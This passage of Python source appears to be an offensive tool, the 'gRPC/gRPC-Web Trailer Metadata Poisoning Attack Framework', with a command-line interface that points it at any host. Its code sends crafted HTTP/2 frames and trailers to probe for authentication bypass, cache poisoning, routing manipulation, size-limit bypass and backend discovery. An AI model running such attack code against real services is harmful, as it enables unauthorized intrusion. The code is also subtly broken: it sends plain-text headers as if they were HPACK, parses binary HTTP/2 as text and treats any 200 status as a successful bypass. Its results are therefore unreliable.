                ) if PROXY_ENABLED and PROXY_AVAILABLE else 
                asyncio.open_connection(
                    self.target_host, 
                    self.target_port, 
                    ssl=context
                )
            )
            
            # Send HTTP/2 connection preface
            writer.write(b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n")
            await writer.drain()
            
            # Build and send HTTP/2 frames
            stream_id = 1
            
            # HEADERS frame
            headers_payload = self._build_headers_payload(headers, trailers)
            headers_frame = HTTP2Frame(
                length=len(headers_payload),
                frame_type=HTTP2FrameType.HEADERS,
                flags=HTTP2FrameFlag.END_HEADERS if not body else 0,
                stream_id=stream_id,
                payload=headers_payload
            )
            
            writer.write(bytes(headers_frame))
            await writer.drain()
            
            # DATA frame if body present
            if body:
                data_frame = HTTP2Frame(
                    length=len(body),
                    frame_type=HTTP2FrameType.DATA,
                    flags=HTTP2FrameFlag.END_STREAM if not trailers else 0,
                    stream_id=stream_id,
                    payload=body
                )
                writer.write(bytes(data_frame))
                await writer.drain()
            
            # TRAILERS frame
            if trailers:
                trailers_payload = self._build_trailers_payload(trailers)
                trailers_frame = HTTP2Frame(
                    length=len(trailers_payload),
                    frame_type=HTTP2FrameType.HEADERS,
                    flags=HTTP2FrameFlag.END_STREAM | HTTP2FrameFlag.END_HEADERS,
                    stream_id=stream_id,
                    payload=trailers_payload
                )
                writer.write(bytes(trailers_frame))
                await writer.drain()
            
            # Read response
            response_data = await asyncio.wait_for(reader.read(65536), timeout=self.timeout)
            
            writer.close()
            await writer.wait_closed()
            
            return self._parse_http2_response(response_data)
            
        except Exception as e:
            logger.debug(f"gRPC request failed: {e}")
            return {'status': 0, 'error': str(e)}
    
    async def _send_targeted_grpc_request(self, endpoint: str, headers: Dict, trailers: Dict, payload: Dict) -> Dict[str, Any]:
        """Send targeted gRPC request to specific endpoint"""
        # Add endpoint to headers
        headers = headers.copy()
        headers[':path'] = endpoint
        headers[':method'] = 'POST'
        headers[':scheme'] = 'https'
        headers[':authority'] = self.target_host
        
        # Create gRPC message
        message_data = json.dumps(payload).encode()
        grpc_message = GrpcMessage(compressed=False, length=len(message_data), data=message_data)
        
        return await self._send_grpc_request_with_trailers(headers, bytes(grpc_message), trailers)
    
    def _build_headers_payload(self, headers: Dict, trailers: Dict) -> bytes:
        """Build HTTP/2 headers payload (HPACK encoded)"""
        # Simplified HPACK encoding - in production, use proper HPACK library
        payload = b""
        
        # Add pseudo-headers first
        pseudo_headers = [':method', ':scheme', ':authority', ':path']
        for pseudo in pseudo_headers:
            if pseudo in headers:
                header_line = f"{pseudo}: {headers[pseudo]}\r\n"
                payload += header_line.encode()
        
        # Add regular headers
        for name, value in headers.items():
            if not name.startswith(':'):
                header_line = f"{name}: {value}\r\n"
                payload += header_line.encode()
        
        # Add trailer declaration if trailers present
        if trailers:
            trailer_names = ','.join(trailers.keys())
            payload += f"trailer: {trailer_names}\r\n".encode()
        
        return payload
    
    def _build_trailers_payload(self, trailers: Dict) -> bytes:
        """Build HTTP/2 trailers payload"""
        payload = b""
        for name, value in trailers.items():
            trailer_line = f"{name}: {value}\r\n"
            payload += trailer_line.encode()
        return payload
    
    def _create_grpc_payload(self, data: Dict) -> bytes:
        """Create gRPC message payload"""
        message_data = json.dumps(data).encode()
        grpc_message = GrpcMessage(compressed=False, length=len(message_data), data=message_data)
        return bytes(grpc_message)
    
    def _parse_http2_response(self, response_data: bytes) -> Dict[str, Any]:
        """Parse HTTP/2 response data"""
        try:
            # Simplified HTTP/2 response parsing
            response_text = response_data.decode('utf-8', errors='ignore')
            
            # Extract status
            status = 200  # Default
            if 'HTTP/2' in response_text:
                status_match = re.search(r'HTTP/2 (\d+)', response_text)
                if status_match:
                    status = int(status_match.group(1))
            
            # Parse headers and trailers
            headers = {}
            trailers = {}
            grpc_status = None
            
            lines = response_text.split('\r\n')
            in_trailers = False
            
            for line in lines:
                if ': ' in line:
                    key, value = line.split(': ', 1)
                    key_lower = key.lower()
                    
                    if key_lower == 'grpc-status':
                        try:
                            grpc_status = int(value)
                        except:
                            pass
                    
                    if in_trailers:
                        trailers[key_lower] = value
                    else:
                        headers[key_lower] = value
                elif line == '' and headers:
                    in_trailers = True
            
            return {
                'status': status,
                'headers': headers,
                'trailers': trailers,
                'grpc_status': grpc_status,
                'body': response_data
            }
            
        except Exception as e:
            return {
                'status': 0,
                'error': f'Parse error: {e}',
                'headers': {},
                'trailers': {}
            }
    
    # Analysis methods
    
    def _analyze_auth_bypass(self, response: Dict) -> bool:
        """Analyze response for authentication bypass"""
        # Check HTTP status
        if response.get('status') in [200, 201, 204]:
            return True
        
        # Check gRPC status
        grpc_status = response.get('grpc_status')
        if grpc_status == GrpcStatusCode.OK:
            return True
        
        # Check for authentication success indicators in response
        body = response.get('body', b'')
        if isinstance(body, bytes):
            body_text = body.decode('utf-8', errors='ignore').lower()
            auth_success_indicators = [
                'authenticated', 'authorized', 'success', 'admin',
                'token_valid', 'access_granted', 'permission_ok'
            ]
            
            for indicator in auth_success_indicators:
                if indicator in body_text:
                    return True
        
        # Check trailers for auth status
        trailers = response.get('trailers', {})
        if trailers.get('x-auth-status') in ['success', 'authorized', 'admin']:
            return True
        
        return False
    
    def _analyze_cache_poisoning(self, poison_response: Dict, victim_response: Dict) -> bool:
        """Analyze for cache poisoning"""
        if not poison_response or not victim_response:
            return False
        
        # Check if victim got poisoned content
        poison_body = poison_response.get('body', b'')
        victim_body = victim_response.get('body', b'')
        
        if poison_body and victim_body:
            # Simple content similarity check
            if len(poison_body) > 100 and len(victim_body) > 100:
                similarity = len(set(poison_body[:100]) & set(victim_body[:100])) / 100
                if similarity > 0.8:  # 80% similarity
                    return True
        
        # Check cache headers
        victim_headers = victim_response.get('headers', {})
        cache_indicators = ['x-cache-hit', 'x-served-from-cache', 'age']
        
        for indicator in cache_indicators:
            if indicator in victim_headers:
                return True
        
        return False
    
    def _analyze_routing_manipulation(self, response: Dict) -> bool:
        """Analyze for routing manipulation"""
        # Check response headers for routing indicators
        headers = response.get('headers', {})
        trailers = response.get('trailers', {})
        
        routing_indicators = [
            'x-backend-server', 'x-upstream-server', 'x-served-by',
            'x-forwarded-by', 'x-proxy-by', 'server'
        ]
        
        # Check if routing-related headers are present
        for indicator in routing_indicators:
            if indicator in headers or indicator in trailers:
                return True
        
        # Check for internal service responses
        body = response.get('body', b'')
        if isinstance(body, bytes):
            body_text = body.decode('utf-8', errors='ignore').lower()
            internal_indicators = [
                'internal', 'admin', 'backend', 'upstream',
                'service mesh', 'istio', 'envoy'
            ]
            
            for indicator in internal_indicators:
                if indicator in body_text:
                    return True
        
        return False
    
    def _extract_auth_evidence(self, response: Dict, vector: Dict) -> List[str]:
        """Extract authentication bypass evidence"""
        evidence = []
        
        status = response.get('status')
        grpc_status = response.get('grpc_status')
        
        if status:
            evidence.append(f"HTTP Status: {status}")
        if grpc_status is not None:
            evidence.append(f"gRPC Status: {grpc_status}")
        
        # Check for admin/privileged content
        body = response.get('body', b'')
        if isinstance(body, bytes):
            body_text = body.decode('utf-8', errors='ignore')
            if any(word in body_text.lower() for word in ['admin', 'privileged', 'internal']):
                evidence.append("Response contains privileged content indicators")
        
        # Check response trailers
        trailers = response.get('trailers', {})
        for key, value in trailers.items():
            if 'auth' in key.lower() or 'role' in key.lower():
                evidence.append(f"Trailer {key}: {value}")
        
        return evidence
    
    def _extract_cache_evidence(self, poison_response: Dict, victim_response: Dict) -> List[str]:
        """Extract cache poisoning evidence"""
        evidence = []
        
        # Response time analysis
        if hasattr(poison_response, 'processing_time_ms') and hasattr(victim_response, 'processing_time_ms'):
            if victim_response.processing_time_ms < poison_response.processing_time_ms * 0.5:
                evidence.append("Victim request significantly faster (cache hit)")
        
        # Cache headers
        victim_headers = victim_response.get('headers', {})
        for header, value in victim_headers.items():
            if 'cache' in header.lower():
                evidence.append(f"Cache header {header}: {value}")
        
        return evidence
    
    def _extract_routing_evidence(self, response: Dict, vector: Dict) -> List[str]:
        """Extract routing manipulation evidence"""
        evidence = []
        
        headers = response.get('headers', {})
        trailers = response.get('trailers', {})
        
        # Backend server information
        backend_headers = ['server', 'x-backend', 'x-upstream', 'x-served-by']
        for header in backend_headers:
            if header in headers:
                evidence.append(f"Backend header {header}: {headers[header]}")
            if header in trailers:
                evidence.append(f"Backend trailer {header}: {trailers[header]}")
        
        return evidence
    
    # Discovery and testing methods
    
    async def _test_grpc_reflection(self) -> Dict[str, Any]:
        """Test gRPC reflection service availability"""
        try:
            reflection_headers = {
                'content-type': 'application/grpc',
                ':path': '/grpc.reflection.v1alpha.ServerReflection/ServerReflectionInfo'
            }
            
            reflection_payload = {
                'list_services': ''
            }
            
            response = await self._send_targeted_grpc_request(
                '/grpc.reflection.v1alpha.ServerReflection/ServerReflectionInfo',
                reflection_headers,
                {},
                reflection_payload
            )
            
            available = response.get('status') == 200 and response.get('grpc_status') == 0
            
            return {
                'method': 'grpc_reflection',
                'available': available,
                'response': response if available else None
            }
            
        except Exception as e:
            return {
                'method': 'grpc_reflection',
                'available': False,
                'error': str(e)
            }
    
    async def _test_endpoint_availability(self, endpoint: str) -> Dict[str, Any]:
        """Test if specific gRPC endpoint is available"""
        try:
            headers = {
                'content-type': 'application/grpc',
                ':path': endpoint
            }
            
            test_payload = {'test': 'availability_check'}
            
            response = await self._send_targeted_grpc_request(endpoint, headers, {}, test_payload)
            
            # Consider available if not explicitly unavailable
            available = response.get('grpc_status') != GrpcStatusCode.UNIMPLEMENTED
            
            return {
                'endpoint': endpoint,
                'available': available,
                'status': response.get('status'),
                'grpc_status': response.get('grpc_status')
            }
            
        except Exception as e:
            return {
                'endpoint': endpoint,
                'available': False,
                'error': str(e)
            }
    
    async def _test_grpc_web_interface(self) -> Dict[str, Any]:
        """Test for gRPC-Web interface availability"""
        try:
            # Test common gRPC-Web endpoints
            grpc_web_headers = {
                'content-type': 'application/grpc-web',
                'x-grpc-web': '1'
            }
            
            response = await self._send_grpc_request_with_trailers(
                grpc_web_headers,
                b'test_grpc_web',
                {}
            )
            
            found = response.get('status') != 404
            
            return {
                'found': found,
                'response': response if found else None
            }
            
        except Exception as e:
            return {
                'found': False,
                'error': str(e)
            }
    
    # Advanced attack implementations
    
    async def _execute_grpc_web_conversion_test(self, test: Dict) -> AttackResult:
        """Execute gRPC-Web conversion differential test"""
        try:
            grpc_request = test['grpc_request']
            grpc_web_request = test['grpc_web_request']
            
            # Send both requests and compare
            grpc_response = await self._send_grpc_native_request(grpc_request)
            grpc_web_response = await self._send_grpc_web_request(grpc_web_request)
            
            # Analyze for conversion vulnerabilities
            conversion_diff = self._analyze_conversion_differences(grpc_response, grpc_web_response)
            
            return AttackResult(
                attack_type='gRPC-Web Conversion',
                target_endpoint=test['name'],
                success=True,
                vulnerability_detected=conversion_diff['has_differences'],
                evidence=conversion_diff['evidence']
            )
            
        except Exception as e:
            return AttackResult(
                attack_type='gRPC-Web Conversion',
                target_endpoint=test['name'],
                success=False,
                vulnerability_detected=False,
                error=str(e)
            )
    
    async def _execute_timing_analysis(self, scenario: Dict) -> Dict[str, Any]:
        """Execute timing analysis"""
        results = {
            'scenario': scenario['name'],
            'timing_measurements': [],
            'timing_leak_detected': False,
            'evidence': []
        }
        
        for test_case in scenario['test_cases']:
            timings = []
            
            # Run multiple timing measurements
            for _ in range(10):
                start_time = time.perf_counter()
                
                response = await self._send_grpc_request_with_trailers(
                    {'content-type': 'application/grpc'},
                    b'timing_test',
                    test_case['trailers']
                )
                
                timing = (time.perf_counter() - start_time) * 1000
                timings.append(timing)
            
            avg_timing = sum(timings) / len(timings)
            variance = sum((t - avg_timing) ** 2 for t in timings) / len(timings)
            
            results['timing_measurements'].append({
                'test_case': test_case,
                'average_time': avg_timing,
                'variance': variance,
                'timings': timings
            })
        
        # Analyze for timing leaks
        if len(results['timing_measurements']) >= 2:
            timings = [m['average_time'] for m in results['timing_measurements']]
            max_diff = max(timings) - min(timings)
            
            if max_diff > 50:  # >50ms difference
                results['timing_leak_detected'] = True
                results['evidence'].append(f"Timing difference detected: {max_diff:.2f}ms")
        
        return results
    
    async def _execute_size_bypass_test(self, test: Dict) -> AttackResult:
        """Execute metadata size bypass test"""
        try:
            if test['technique'] == 'single_large_trailer':
                # Create oversized trailer
                large_data = 'A' * test['trailer_size']
                trailers = {'x-large-data': large_data}
                
            elif test['technique'] == 'multiple_trailers':
                # Create many trailers
                trailers = {}
                for i in range(test['trailer_count']):
                    trailers[f'x-data-{i}'] = f'payload_{i}_' + 'A' * 100
                    
            elif test['technique'] == 'compression':
                # Create compressible data
                compressible_data = 'AAAA' * (test.get('trailer_size', 1000) // 4)
                compressed = base64.b64encode(gzip.compress(compressible_data.encode()))
                trailers = {'x-compressed-data': compressed.decode()}
            
            response = await self._send_grpc_request_with_trailers(
                {'content-type': 'application/grpc'},
                b'size_bypass_test',
                trailers
            )
            
            success = response.get('status') == 200
            evidence = [f"Large trailer test: {test['technique']}"]
            
            return AttackResult(
                attack_type='Size Bypass',
                target_endpoint=test['name'],
                success=success,
                vulnerability_detected=success,
                evidence=evidence
            )
            
        except Exception as e:
            return AttackResult(
                attack_type='Size Bypass',
                target_endpoint=test['name'],
                success=False,
                vulnerability_detected=False,
                error=str(e)
            )
    
    async def _execute_h2_h1_conversion_test(self, vector: Dict) -> AttackResult:
        """Execute HTTP/2 to HTTP/1.1 conversion test"""
        try:
            # Test trailer conversion behavior
            headers = {
                'content-type': 'application/grpc',
                'connection': 'upgrade',  # Force HTTP/1.1 characteristics
                'upgrade': 'h2c'
            }
            
            response = await self._send_grpc_request_with_trailers(
                headers,
                b'h2_h1_conversion_test',
                vector['http2_trailers']
            )
            
            # Check if trailers were converted to headers
            conversion_detected = self._analyze_h2_h1_conversion(response, vector)
            
            return AttackResult(
                attack_type='HTTP/2 to HTTP/1.1 Conversion',
                target_endpoint=vector['name'],
                success=response.get('status') == 200,
                vulnerability_detected=conversion_detected,
                evidence=self._extract_conversion_evidence(response, vector)
            )
            
        except Exception as e:
            return AttackResult(
                attack_type='HTTP/2 to HTTP/1.1 Conversion',
                target_endpoint=vector['name'],
                success=False,
                vulnerability_detected=False,
                error=str(e)
            )
    
    async def _execute_backend_discovery(self, technique: Dict) -> Dict[str, Any]:
        """Execute backend service discovery"""
        try:
            response = await self._send_grpc_request_with_trailers(
                {'content-type': 'application/grpc'},
                b'backend_discovery',
                technique['trailers']
            )
            
            # Look for service information in response
            services_found = self._extract_service_info(response)
            
            return {
                'technique': technique['name'],
                'services_found': services_found,
                'response': response
            }
            
        except Exception as e:
            return {
                'technique': technique['name'],
                'services_found': [],
                'error': str(e)
            }
    
    async def _execute_protocol_confusion_test(self, scenario: Dict) -> AttackResult:
        """Execute protocol confusion test"""
        try:
            attack_vector = scenario['attack_vector']
            
            response = await self._send_grpc_request_with_trailers(
                attack_vector['headers'],
                b'protocol_confusion_test',
                attack_vector['trailers']
            )
            
            # Look for protocol confusion indicators
            confusion_detected = self._analyze_protocol_confusion(response)
            
            return AttackResult(
                attack_type='Protocol Confusion',
                target_endpoint=scenario['name'],
                success=response.get('status') == 200,
                vulnerability_detected=confusion_detected,
                evidence=self._extract_confusion_evidence(response)
            )
            
        except Exception as e:
            return AttackResult(
                attack_type='Protocol Confusion',
                target_endpoint=scenario['name'],
                success=False,
                vulnerability_detected=False,
                error=str(e)
            )
    
    # Helper methods for sending different request types
    
    async def _send_grpc_native_request(self, request_config: Dict) -> Dict[str, Any]:
        """Send native gRPC request"""
        headers = {
            'content-type': 'application/grpc+proto',
            'grpc-accept-encoding': 'gzip',
            'te': 'trailers'
        }
        
        trailers = request_config.get('trailers', {})
        payload = b'native_grpc_test'
        
        return await self._send_grpc_request_with_trailers(headers, payload, trailers)
    
    async def _send_grpc_web_request(self, request_config: Dict) -> Dict[str, Any]:
        """Send gRPC-Web request"""
        grpc_format = request_config.get('format', GrpcWebFormat.BINARY)
        
        headers = {
            'content-type': grpc_format.value,
            'x-grpc-web': '1',
            'x-user-agent': 'grpc-web-javascript/0.1'
        }
        
        payload = b'grpc_web_test'
        trailers = request_config.get('trailers', {})
        
        # Handle different gRPC-Web formats
        if grpc_format in [GrpcWebFormat.TEXT, GrpcWebFormat.PROTO_TEXT]:
            # Base64 encode for text format
            payload = base64.b64encode(payload)
        
        return await self._send_grpc_request_with_trailers(headers, payload, trailers)
    
    # Analysis helper methods
    
    def _analyze_conversion_differences(self, grpc_response: Dict, grpc_web_response: Dict) -> Dict[str, Any]:
        """Analyze conversion differences between gRPC and gRPC-Web"""
        differences = {
            'has_differences': False,
            'evidence': []
        }
        
        # Status code differences
        grpc_status = grpc_response.get('status', 0)
        web_status = grpc_web_response.get('status', 0)
        
        if grpc_status != web_status:
            differences['has_differences'] = True
            differences['evidence'].append(f"Status difference: gRPC={grpc_status}, gRPC-Web={web_status}")
        
        # Trailer handling differences
        grpc_trailers = grpc_response.get('trailers', {})
        web_trailers = grpc_web_response.get('trailers', {})
        
        if len(grpc_trailers) != len(web_trailers):
            differences['has_differences'] = True
            differences['evidence'].append("Trailer count differs between formats")
        
        return differences
    
    def _analyze_h2_h1_conversion(self, response: Dict, vector: Dict) -> bool:
        """Analyze HTTP/2 to HTTP/1.1 conversion behavior"""
        headers = response.get('headers', {})
        
        # Check if HTTP/2 trailers appeared as HTTP/1.1 headers
        for trailer_name in vector['http2_trailers'].keys():
            if trailer_name in headers:
                return True
        
        # Check for conversion artifacts
        conversion_artifacts = ['x-http2-trailer', 'x-converted-trailer']
        for artifact in conversion_artifacts:
            if artifact in headers:
                return True
        
        return False
    
    def _analyze_protocol_confusion(self, response: Dict) -> bool:
        """Analyze for protocol confusion"""
        headers = response.get('headers', {})
        
        # Look for mixed protocol indicators
        http_indicators = ['location', 'set-cookie', 'www-authenticate']
        websocket_indicators = ['sec-websocket-accept', 'sec-websocket-protocol']
        
        http_found = any(indicator in headers for indicator in http_indicators)
        websocket_found = any(indicator in headers for indicator in websocket_indicators)
        
        return http_found or websocket_found
    
    def _extract_service_info(self, response: Dict) -> List[str]:
        """Extract service information from response"""
        services = []
        
        headers = response.get('headers', {})
        body = response.get('body', b'')
        
        # Look for service mesh debug info
        debug_headers = ['x-envoy-upstream-service', 'x-istio-service', 'x-consul-service']
        for header in debug_headers:
            if header in headers:
                services.append(headers[header])
        
        # Parse body for service names
        if isinstance(body, bytes):
            body_text = body.decode('utf-8', errors='ignore')
            service_patterns = [
                r'service[_-]([a-zA-Z0-9\-_]+)',
                r'upstream[_-]([a-zA-Z0-9\-_]+)',
                r'backend[_-]([a-zA-Z0-9\-_]+)'
            ]
            
            for pattern in service_patterns:
                matches = re.findall(pattern, body_text, re.IGNORECASE)
                services.extend(matches)
        
        return list(set(services))  # Remove duplicates
    
    def _extract_conversion_evidence(self, response: Dict, vector: Dict) -> List[str]:
        """Extract conversion evidence"""
        evidence = []
        
        headers = response.get('headers', {})
        
        # Check for converted trailers
        for trailer_name in vector['http2_trailers'].keys():
            if trailer_name in headers:
                evidence.append(f"Trailer {trailer_name} converted to header")
        
        return evidence
    
    def _extract_confusion_evidence(self, response: Dict) -> List[str]:
        """Extract protocol confusion evidence"""
        evidence = []
        
        headers = response.get('headers', {})
        
        # Mixed protocol evidence
        if 'location' in headers:
            evidence.append("HTTP redirect in gRPC response")
        if 'set-cookie' in headers:
            evidence.append("HTTP cookie in gRPC response")
        if 'sec-websocket-accept' in headers:
            evidence.append("WebSocket headers in gRPC response")
        
        return evidence
    
    def compile_attack_statistics(self) -> Dict[str, Any]:
        """Compile comprehensive attack statistics"""
        stats = self.attack_stats.copy()
        
        stats['success_rates'] = {
            'overall': stats['successful_attacks'] / max(stats['total_attacks'], 1),
            'auth_bypass': stats['auth_bypasses'] / max(stats['total_attacks'], 1),
            'cache_poisoning': stats['cache_poisoning'] / max(stats['total_attacks'], 1),
            'routing_manipulation': stats['routing_manipulation'] / max(stats['total_attacks'], 1)
        }
        
        stats['endpoints_discovered'] = len(self.discovered_endpoints)
        
        return stats
    
    def _analyze_vulnerabilities(self, results: Dict[str, Any]):
        """Analyze and categorize discovered vulnerabilities"""
        all_vulnerabilities = []
        
        # Collect vulnerabilities from all attack phases
        for attack_type, attack_results in results['attacks'].items():
            if isinstance(attack_results, dict) and 'vulnerabilities' in attack_results:
                all_vulnerabilities.extend(attack_results['vulnerabilities'])
        
        # Categorize by severity
        results['vulnerabilities'] = all_vulnerabilities
        results['vulnerability_summary'] = {
            'total': len(all_vulnerabilities),
            'critical': len([v for v in all_vulnerabilities if v.get('severity') == 'CRITICAL']),
            'high': len([v for v in all_vulnerabilities if v.get('severity') == 'HIGH']),
            'medium': len([v for v in all_vulnerabilities if v.get('severity') == 'MEDIUM']),
            'low': len([v for v in all_vulnerabilities if v.get('severity') == 'LOW'])
        }
        
        # Overall risk assessment
        if results['vulnerability_summary']['critical'] > 0:
            results['risk_level'] = 'CRITICAL'
        elif results['vulnerability_summary']['high'] > 0:
            results['risk_level'] = 'HIGH'
        elif results['vulnerability_summary']['medium'] > 0:
            results['risk_level'] = 'MEDIUM'
        else:
            results['risk_level'] = 'LOW'

# Utility Functions
def format_results_json(results: Dict[str, Any]) -> str:
    """Format results as JSON"""
    return json.dumps(results, indent=2, default=str)

def format_results_report(results: Dict[str, Any]) -> str:
    """Format results as human-readable report"""
    report = []
    report.append("="*80)
    report.append("gRPC/gRPC-Web TRAILER METADATA POISONING ASSESSMENT")
    report.append("="*80)
    
    report.append(f"\nTarget: {results.get('target')}")
    report.append(f"Assessment Time: {results.get('timestamp')}")
    report.append(f"Duration: {results.get('metadata', {}).get('assessment_duration', 0):.2f}s")
    report.append(f"Endpoints Discovered: {results.get('metadata', {}).get('endpoints_discovered', 0)}")
    
    # Summary
    vuln_summary = results.get('vulnerability_summary', {})
    report.append(f"\n VULNERABILITY SUMMARY:")
    report.append(f"   Total Vulnerabilities: {vuln_summary.get('total', 0)}")
    report.append(f"   Critical: {vuln_summary.get('critical', 0)}")
    report.append(f"   High: {vuln_summary.get('high', 0)}")
    report.append(f"   Medium: {vuln_summary.get('medium', 0)}")
    report.append(f"   Risk Level: {results.get('risk_level', 'UNKNOWN')}")
    
    # Detailed vulnerabilities
    if results.get('vulnerabilities'):
        report.append(f"\n DETAILED VULNERABILITIES:")
        for i, vuln in enumerate(results['vulnerabilities'], 1):
            report.append(f"\n   {i}. [{vuln['severity']}] {vuln['type']}")
            report.append(f"      Description: {vuln.get('description', 'N/A')}")
            report.append(f"      Impact: {vuln['impact']}")
            if vuln.get('evidence'):
                report.append(f"      Evidence: {', '.join(vuln['evidence'][:3])}")
    
    # Statistics
    stats = results.get('statistics', {})
    if stats:
        report.append(f"\n ATTACK STATISTICS:")
        report.append(f"   Total Attacks: {stats.get('total_attacks', 0)}")
        report.append(f"   Successful Attacks: {stats.get('successful_attacks', 0)}")
        report.append(f"   Auth Bypasses: {stats.get('auth_bypasses', 0)}")
        report.append(f"   Cache Poisoning: {stats.get('cache_poisoning', 0)}")
        report.append(f"   Routing Manipulation: {stats.get('routing_manipulation', 0)}")
    
    return '\n'.join(report)

async def main():
    """Enhanced main function with comprehensive CLI"""
    import argparse
    
    parser = argparse.ArgumentParser(
        description='Advanced gRPC/gRPC-Web Trailer Metadata Poisoning Attack Framework v4.0',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s grpc.example.com
  %(prog)s api.service.com --port 8443 --timeout 15
  %(prog)s internal.grpc --output assessment.json --format json
  %(prog)s target.com --verbose --max-retries 5
        """
    )
    
    parser.add_argument('host', help='Target gRPC service hostname or IP address')
    parser.add_argument('--port', type=int, default=443, help='Target port (default: 443)')
    parser.add_argument('--timeout', type=float, default=10.0, help='Connection timeout (default: 10.0)')
    parser.add_argument('--max-retries', type=int, default=3, help='Maximum retry attempts (default: 3)')
    parser.add_argument('--output', '-o', help='Output file path')
    parser.add_argument('--format', choices=['json', 'report'], default='report', help='Output format (default: report)')
    parser.add_argument('--verbose', '-v', action='store_true', help='Enable verbose logging')
    
    args = parser.parse_args()
    
    if args.verbose:
        logging.basicConfig(level=logging.DEBUG)
    
    print(f" gRPC/gRPC-Web Trailer Metadata Poisoning Attack Framework v4.0")
    print(f" Target: {args.host}:{args.port}")
    print(f"  Configuration: timeout={args.timeout}s, retries={args.max_retries}")
    print(f" Starting comprehensive gRPC trailer poisoning assessment...")
    print()
    
    # Create attack framework
    attacker = GrpcTrailerPoisoning(
        target_host=args.host,
        target_port=args.port,
        timeout=args.timeout,
        max_retries=args.max_retries
    )
    
    try:
        # Run comprehensive assessment
        results = await attacker.run_comprehensive_assessment()
        
        # Format output
        if args.format == 'json':
            output = format_results_json(results)
        else:
            output = format_results_report(results)
        
        # Write to file or stdout
        if args.output:
            with open(args.output, 'w', encoding='utf-8') as f:
                f.write(output)
            print(f" Assessment results written to: {args.output}")
        else:
            print(output)
        
        # Exit with appropriate code based on risk level
        risk_to_exit_code = {
            'CRITICAL': 4,
            'HIGH': 3,
            'MEDIUM': 2,
            'LOW': 1,
            'NONE': 0
        }
        
        exit_code = risk_to_exit_code.get(results.get('risk_level', 'NONE'), 0)
        return exit_code
        
    except KeyboardInterrupt:
        print("\n️  Assessment interrupted by user")
        return 130
    except Exception as e:
        logger.error(f"Assessment failed: {e}")
        if args.verbose:
            import traceback
            traceback.print_exc()
        return 1

if __name__ == "__main__":
    import sys
    exit_code = asyncio.run(main())
    sys.exit(exit_code)
